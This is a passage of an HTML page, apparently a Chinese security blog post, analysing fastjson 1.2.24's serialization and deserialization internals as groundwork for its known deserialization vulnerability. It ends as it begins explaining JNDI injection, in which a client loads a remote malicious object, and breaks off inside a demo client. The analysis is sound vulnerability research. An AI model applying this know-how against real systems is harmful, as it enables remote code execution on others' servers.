@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Fastjson反序列化 | _KernelPanic</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="关于Java版本Java8 -&gt; JDK 1.8.0_241-b07 -&gt; JDK 8u241 从xxlengend的payload说起 本文在以下环境中进行实验 java version “1.8.0_192”Java(TM) SE Runtime Environment (build 1.8.0_192-b12)Java HotSpot(TM) 64-Bit Server VM (">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson反序列化">
+<meta property="og:url" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="_KernelPanic">
+<meta property="og:description" content="关于Java版本Java8 -&gt; JDK 1.8.0_241-b07 -&gt; JDK 8u241 从xxlengend的payload说起 本文在以下环境中进行实验 java version “1.8.0_192”Java(TM) SE Runtime Environment (build 1.8.0_192-b12)Java HotSpot(TM) 64-Bit Server VM (">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7BC61AFF-7D40-4601-B84B-A53998724494.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8465C118-A1E9-4B43-AF7D-1AA5740FBB56.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CEA321E0-84F3-4D6F-882C-E750412E39B1.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/621D38B9-2DFA-417E-BFEE-B8838F71A3DE.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/90D07A98-C8F5-4AD6-8F0B-463372DAB404.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7D7EFFF5-80E7-4384-B262-79C876FD5687.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/A418AA14-81E1-4C82-A6A1-DC438B174A12.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/98BDC041-5ABE-4F88-AEBD-7245DD1AF080.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/70222CC4-BC8E-44FC-B9E2-8D9D5DD05441.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/D86DA741-8D5C-431A-878E-5139211CFD80.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/AB103633-30E3-484D-9224-CBDE08296CC6.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/29B44AFE-B632-4164-9F74-A1D53A6A8DBC.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/98823C14-B557-4A84-BD39-58753AA4B9AB.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/BA4AD3E5-CDB3-451B-A334-D8DED574E706.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/03FA1470-F125-41E2-A247-295F3C6A09F9.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6FDA8732-A31C-4F29-B240-9832AC1EA1AE.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/EEC31EF3-9780-407B-9980-FF02EE03A9B0.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CF9A3613-C8B8-4A9E-A702-04648F3D4EB7.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/538A8122-370D-4E36-8B45-C72CF4F30E31.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/532D1CB8-380C-4596-8250-03C84BCAEA20.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/787DB4D6-09BD-4E36-9B4A-4EBB50197A5A-5978764.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/70D0D28A-0FEE-4D9F-962A-F4E4641C6619-5978770.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9FA71DB0-F2E3-482C-BACA-279F6461AB1C.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7A7A0E1E-DBD0-4D98-9923-8747A549789D.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5DB7C577-A00F-4A28-82F5-E5448D403249.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/BCD940CF-E619-4AF0-8806-4491174AA82D.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/EECFAB2F-1C60-4E50-9BCC-BA54C5675102.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/47C72321-030B-42EF-A332-E58AF099555C.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200405003201845.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200404220349806.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200404220558086.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200404221455933.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200404232052152.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200405134201277.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200410220355915.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200410234925624.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200411001638162.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200411002000317.png">
+<meta property="og:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200411005234842.png">
+<meta property="article:published_time" content="2020-04-04T05:29:35.000Z">
+<meta property="article:modified_time" content="2020-11-29T11:28:59.861Z">
+<meta property="article:author" content="_KernelPanic">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://chiahao.top/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7BC61AFF-7D40-4601-B84B-A53998724494.png">
+  
+    <link rel="alternate" href="/atom.xml" title="_KernelPanic" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">_KernelPanic</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">web security &amp; android security</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://chiahao.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-fastjson反序列化" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  <time datetime="2020-04-04T05:29:35.000Z" itemprop="datePublished">2020-04-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Fastjson反序列化
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="关于Java版本"><a href="#关于Java版本" class="headerlink" title="关于Java版本"></a>关于Java版本</h2><p>Java8 -&gt; JDK 1.8.0_241-b07 -&gt; JDK 8u241</p>
+<h2 id="从xxlengend的payload说起"><a href="#从xxlengend的payload说起" class="headerlink" title="从xxlengend的payload说起"></a>从xxlengend的payload说起</h2><blockquote>
+<p>本文在以下环境中进行实验</p>
+<p>java version “1.8.0_192”<br>Java(TM) SE Runtime Environment (build 1.8.0_192-b12)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.192-b12, mixed mode)</p>
+</blockquote>
+<p>如何正常编译：</p>
+<p>1.首先注释掉所有的setAutoTypeSupport函数，1.2.24版本中没有这个方法</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7BC61AFF-7D40-4601-B84B-A53998724494.png" alt="img"></p>
+<p>2.如果用的是Mac的话，记得把路径修改成斜线（原代码中是反斜线，这样会找不到对应的路径）</p>
+<p>3.修改Test.java文件中要执行的命令</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8465C118-A1E9-4B43-AF7D-1AA5740FBB56.png" alt="img"></p>
+<p>4.编译选项要选择Poc</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CEA321E0-84F3-4D6F-882C-E750412E39B1.png" alt="img"></p>
+<p>此时即可触发第一种payload</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/621D38B9-2DFA-417E-BFEE-B8838F71A3DE.png" alt="img"></p>
+<h2 id="使用fastjson进行序列化"><a href="#使用fastjson进行序列化" class="headerlink" title="使用fastjson进行序列化"></a>使用fastjson进行序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Boolean sex;</span><br><span class="line">    <span class="keyword">private</span> Properties prop = <span class="keyword">new</span> Properties();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"User() is called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setAge() is called"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">getSex</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getGrade() is called"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getProp() is called"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.prop;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String s = <span class="string">"[User Object] name="</span> + <span class="keyword">this</span>.name + <span class="string">", age="</span> + <span class="keyword">this</span>.age + <span class="string">", prop="</span> + <span class="keyword">this</span>.prop + <span class="string">", sex="</span> + <span class="keyword">this</span>.sex;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstr = <span class="string">"&#123;\"@type\":\"fastjsontest.User\", \"name\":\"Tom\", \"age\": 13, \"prop\": &#123;&#125;, \"sex\": 1&#125;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.name = <span class="string">"anakin"</span>;</span><br><span class="line">        user.age = <span class="number">25</span>;</span><br><span class="line">        user.sex = <span class="keyword">true</span>;</span><br><span class="line">        user.prop.setProperty(<span class="string">"foo"</span>, <span class="string">"bar"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String jsonString = JSON.toJSONString(user);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        Object obj = JSON.parseObject(jsonstr, User.class);</span></span><br><span class="line"><span class="comment">//        System.out.println(obj);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面调试一下几个关键的过程，fastjson版本为1.2.24</p>
+<p>将一个javabean序列化成JSONString的过程如下：</p>
+<p>1.获取SerializeWriter，这一过程中会对需要序列化的类进行分析，如果不在fastjson默认的序列化器中，将会根据javabean的信息创建一个。这一过程中的关键函数是</p>
+<p>com/alibaba/fastjson/serializer/SerializeConfig.java中的getObjectWriter，在阅读源码的过程中也可以看到fastjson对常见的类都有相应的序列化器。（例如Map, List, Collection Date…)</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/90D07A98-C8F5-4AD6-8F0B-463372DAB404.png" alt="img"></p>
+<p>一系列的判断之后，如果我们需要序列化的javabean没有在fastjson已知的列表里，如果开启了create选项（默认开启的），就会根据javabean自身的信息来构建序列化器</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7D7EFFF5-80E7-4384-B262-79C876FD5687.png" alt="img"></p>
+<p>继续向下跟进，会来到TypeUtils.buildBeanInfo和createJavaBeanSerializer，首先会对javabean的信息进行扫描（出于性能考虑），然后按照某种规则对javabean进行序列化，这个我们继续看</p>
+<p>对javabean进行扫描的过程如下：</p>
+<p>1.利用反射机制获取javabean的所有属性，如果有继承关系则继续扫描父类的属性（无继承关系的话父类是Object.class）</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/A418AA14-81E1-4C82-A6A1-DC438B174A12.png" alt="img"></p>
+<p>2.对扫描出的属性进行分析，这里处理的函数是computeGetters（com/alibaba/fastjson/util/TypeUtils.java）</p>
+<p>利用反射机制取出class中所有的方法</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/98BDC041-5ABE-4F88-AEBD-7245DD1AF080.png" alt="img"></p>
+<p>符合以下条件的方法会被处理：</p>
+<ul>
+<li>不是静态方法</li>
+<li>返回值不为void</li>
+<li>不返回ClassLoader</li>
+<li>方法非getMetaClass</li>
+<li>以get开头，方法名大于3，且get后的第一个字母大写（即符合javabean中getter规范的方法）</li>
+</ul>
+<p>处理方法为将getter方法与属性对应起来，存放到fieldInfo对象中，再放到fieldInfoMap里</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/70222CC4-BC8E-44FC-B9E2-8D9D5DD05441.png" alt="img"></p>
+<p>3.当完成对getter的扫描后，会继续获取类的public属性</p>
+<blockquote>
+<p>clazz.getFields()获取的是public属性；clazz.getDeclaredFields()获取的是所有属性</p>
+</blockquote>
+<p>这里还会将public属性也存放到ArrayList中</p>
+<p>可以说序列化过程中需要处理的也就是在fieldInfoList中存放的各个属性了，其他的属性不会继续在下面的过程中处理。扫描后的信息会存放在SerializeBeanInfo类</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/D86DA741-8D5C-431A-878E-5139211CFD80.png" alt="img"></p>
+<p>接下来会进入serializer创建过程，这一过程是字节码操作</p>
+<p>也由于这一过程都是字节码操作，无法继续跟进调试</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/AB103633-30E3-484D-9224-CBDE08296CC6.png" alt="img"></p>
+<p>刚才过程中创建出的序列化器会在这里使用，write函数会对根据刚才规则筛选出的几个属性进行序列化操作</p>
+<p>可以从变量里看出逐步的在写入JSONString</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/29B44AFE-B632-4164-9F74-A1D53A6A8DBC.png" alt="img"></p>
+<p>最终的结果为：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"anakin"</span>,<span class="attr">"prop"</span>:&#123;<span class="attr">"foo"</span>:<span class="string">"bar"</span>&#125;,<span class="attr">"sex"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用fastjson进行反序列化"><a href="#使用fastjson进行反序列化" class="headerlink" title="使用fastjson进行反序列化"></a>使用fastjson进行反序列化</h2><p>反序列化过程是将JSONString还原回对象的过程，例如：</p>
+<p>Object obj = JSON.parseObject(jsonstr, User.class);</p>
+<p>这里涉及到两个API，JSON.parse()和JSON.parseObject。在漏洞利用过程中这两个方法会有些许区别</p>
+<p>先来看下parseObject</p>
+<p>经过几个封装的方法后会进入DefaultJSONParser中</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/98823C14-B557-4A84-BD39-58753AA4B9AB.png" alt="img"></p>
+<p>在DefaultJSONParser构造过程中可以发现，fastjson对两种符号存在特殊处理</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/BA4AD3E5-CDB3-451B-A334-D8DED574E706.png" alt="img"></p>
+<p>在parser构建过程中的一个细节，会检查clazz是否在denyList里，这里是1.2.24版本（也就是在反序列化漏洞爆发之前的版本）denyList里存放的是java.lang.Thread类（com/alibaba/fastjson/parser/ParserConfig.java）</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/03FA1470-F125-41E2-A247-295F3C6A09F9.png" alt="img"></p>
+<p>和序列化过程一样，在构造反序列化的parser时会先扫描是否反序列化的是已知的类，如果没有会创建一个新的反序列化器</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6FDA8732-A31C-4F29-B240-9832AC1EA1AE.png" alt="img"></p>
+<p>这里的逻辑和createJavaBeanSerializer有些差异，继续跟进下看看：</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/EEC31EF3-9780-407B-9980-FF02EE03A9B0.png" alt="img"></p>
+<p>com/alibaba/fastjson/util/JavaBeanInfo.java 这里是反序列化的行为。反序列化过程中除了调用setter还会调用getter</p>
+<p>对于setter方法，需要符合以下条件：</p>
+<ol>
+<li>方法名大于3</li>
+<li>非静态方法</li>
+<li>返回值为空，且返回值不能是声明自身的类</li>
+<li>入参只有1个</li>
+<li>以set开始，且第四个字母是大写（这里在编码的时候考虑了只有setXXX方法，但是找不到声明对应的属性的情况，例如属性名是Boolean isRight = True）</li>
+</ol>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CF9A3613-C8B8-4A9E-A702-04648F3D4EB7.png" alt="img"></p>
+<p>在获取所有的setter方法之后，会对类里public属性进行扫描</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/538A8122-370D-4E36-8B45-C72CF4F30E31.png" alt="img"></p>
+<p>对于不在fieldList里的public属性，会手动添加到fieldList中</p>
+<p>在处理完setter方法后，会继续对getter方法进行处理，重点来了。符合以下规则的getter方法会被特殊处理：</p>
+<ol>
+<li>方法名大于3</li>
+<li>非静态方法</li>
+<li>以get开始，且第四个字母大写</li>
+<li>是Collection||Map||AtomicBoolean||AtomicInteger||AtomicLong中某个类的子类</li>
+<li>有getter方法但没有setter方法（如果有setter方法，在上面就会被处理了）</li>
+</ol>
+<p>最终在反序列化的时候会调用这个getter方法</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/532D1CB8-380C-4596-8250-03C84BCAEA20.png" alt="img"></p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/787DB4D6-09BD-4E36-9B4A-4EBB50197A5A-5978764.png" alt="img"></p>
+<p>其实这里是为了兼容几种数据类型的写法，例如getProp方法其实会返回一个Properties对象，这里fastjson替用户封装了一步，直接写getProp也能正常的向里面放数据。</p>
+<p>lexer.token</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/70D0D28A-0FEE-4D9F-962A-F4E4641C6619-5978770.png" alt="img"></p>
+<p>反序列化过程在com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java中，使用lexer对input进行扫描，按JSON的语法进行对象还原</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9FA71DB0-F2E3-482C-BACA-279F6461AB1C.png" alt="img"></p>
+<p>charArrayCompare方法写的有些迷惑，从这里看它是严格按照顺序来匹配的，从第一个键值对开始，位置不对则不匹配</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7A7A0E1E-DBD0-4D98-9923-8747A549789D.png" alt="img"></p>
+<p>关键点：@type，这里会判断type和当前反序列化的类是否是相同的</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5DB7C577-A00F-4A28-82F5-E5448D403249.png" alt="img"></p>
+<p>从JSONString中解析出一个值后，会使用setValue方法去给对象赋值</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/BCD940CF-E619-4AF0-8806-4491174AA82D.png" alt="img"></p>
+<p>此时其实已经创建了对象，无参构造器已经被调用了</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/EECFAB2F-1C60-4E50-9BCC-BA54C5675102.png" alt="img"></p>
+<p>准确来说是在com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java createInstance这里创建的</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/47C72321-030B-42EF-A332-E58AF099555C.png" alt="img"></p>
+<p>其实setValue方法在实现时，是在fieldInfo对象中取出了里面的setter方法，然后通过调用setter方法为javabean赋值</p>
+<h2 id="fastjson-1-2-24反序列化漏洞"><a href="#fastjson-1-2-24反序列化漏洞" class="headerlink" title="fastjson 1.2.24反序列化漏洞"></a>fastjson 1.2.24反序列化漏洞</h2><p>理清序列化和反序列化过程之后再来看这个漏洞的几种不同的payload</p>
+<h3 id="铺垫：JNDI注入"><a href="#铺垫：JNDI注入" class="headerlink" title="铺垫：JNDI注入"></a>铺垫：JNDI注入</h3><p>关于JNDI相关的攻击方式，可以参考pwntester 2016年的blackhat演讲，<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">材料</a></p>
+<p>JNDI -&gt; Java Naming and Directory Interface</p>
+<p>Naming Service: key -&gt; value; key -&gt; object, such as DNS and file systems</p>
+<p>Directory Service: Special type of Naming Service, that allows storing and finding of “directory objects”. A directory object differs from generic objects in that it’s possible to associate attrbutes to the object. (LDAP)</p>
+<p>JNDI是一套接口，类似于索引中心，允许客户端通过name发现和查找数据以及对象。这些对象可以存储在不同的服务中，例如远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。</p>
+<p>JNDI可以：</p>
+<ol>
+<li>直接绑定远程对象</li>
+<li>绑定Reference</li>
+</ol>
+<p>如果绑定Reference，为什么恶意代码会在Client执行，而非攻击者的Server执行？因为在Server绑定Reference时，这个恶意对象是不在Server上的，Reference指向某个地址，Client会去这个地址取出对象并在Client实例化</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200405003201845.png" alt="image-20200405003201845"></p>
+<p>既然是索引中心，那么JNDI就要分为client（查询）和server（注册资源）看一个最简单的demo：</p>
+<p>Client:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        